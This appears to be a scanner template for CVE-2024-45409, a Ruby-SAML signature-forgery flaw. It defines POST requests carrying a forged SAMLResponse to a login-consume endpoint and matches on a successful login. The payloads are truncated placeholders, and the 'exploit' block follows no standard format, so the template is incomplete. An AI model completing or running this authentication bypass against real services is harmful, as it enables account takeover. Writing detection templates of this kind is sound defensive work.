id: cve-2024-45409
info:
  name: Ruby-SAML Signature Forgery
  author: FerzDevZ
  severity: critical
  description: Vulnerability in Ruby-SAML allows for signature forgery, leading to authentication bypass.
requests:
  - method: POST
    path:
      - "/saml/consume"
    body: "SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wi..."
    matchers:
      - type: status
        status: [302]
exploit:
  steps:
    - method: POST
      path: "/saml/consume"
      body: "SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wi...[FORGED]..."
      matchers:
        - type: word
          words: ["logged_in"]
